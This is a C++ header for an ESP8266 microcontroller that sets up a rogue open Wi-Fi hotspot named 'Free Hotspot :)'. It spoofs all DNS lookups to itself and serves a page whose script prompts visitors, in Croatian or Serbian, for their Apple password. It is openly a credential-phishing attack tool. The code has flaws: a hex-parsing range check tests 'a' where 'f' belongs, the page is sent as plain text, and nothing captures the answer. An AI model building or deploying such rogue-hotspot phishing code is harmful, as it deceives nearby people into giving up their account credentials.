#ifndef DNSSPOOF_H_
#define DNSSPOOF_H_

//http://stackoverflow.com/questions/36404812/convert-string-to-hex-on-arduino-platform

#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

namespace DNSSpoofer {
	const byte DNS_PORT = 53;
	IPAddress apIP(192, 168, 1, 1);
	DNSServer dnsServer;
	ESP8266WebServer webServer(80);

	char nibble2c(char c)
	{
	   if ((c>='0') && (c<='9'))
	      return c-'0' ;
	   if ((c>='A') && (c<='F'))
	      return c+10-'A' ;
	   if ((c>='a') && (c<='a'))
	      return c+10-'a' ;
	   return -1 ;
	}

	char hex2c(char c1, char c2)
	{
	   if(nibble2c(c2) >= 0)
	     return nibble2c(c1)*16+nibble2c(c2) ;
	   return nibble2c(c1) ;
	}

	String hex2str(char *data)
	{
	   String result = "" ;
	   for (int i=0 ; nibble2c(data[i])>=0 ; i++)
	   {
	      result += hex2c(data[i],data[i+1]) ;
	      if(nibble2c(data[i+1])>=0)
	        i++ ;
	   }
	   return result;
	}

	int startDnsSpoofer(char *payload, int time) {
		WiFi.mode(WIFI_AP);
		WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
		WiFi.softAP("Free Hotspot :)");

		dnsServer.setTTL(300);
		dnsServer.setErrorReplyCode(DNSReplyCode::ServerFailure);

		dnsServer.start(DNS_PORT, "*", apIP);

		webServer.onNotFound([&payload]() {
			String message = "<!doctype html><html><head><script>";
			message += "prompt('Molimo, unesite vasu Apple lozinku:');";
			message += "</script><body></body></html>";
			Serial.println(message);
			webServer.send(200, "text/plain", message);
		});

		webServer.begin();

		int timeInMs = time * 1000;
		while (timeInMs) {
			  dnsServer.processNextRequest();
			  webServer.handleClient();
			  timeInMs -= 100;
			  delay(100);
		}
		webServer.stop();
		WiFi.mode(WIFI_STA);
		return 1;
	}
}

#endif
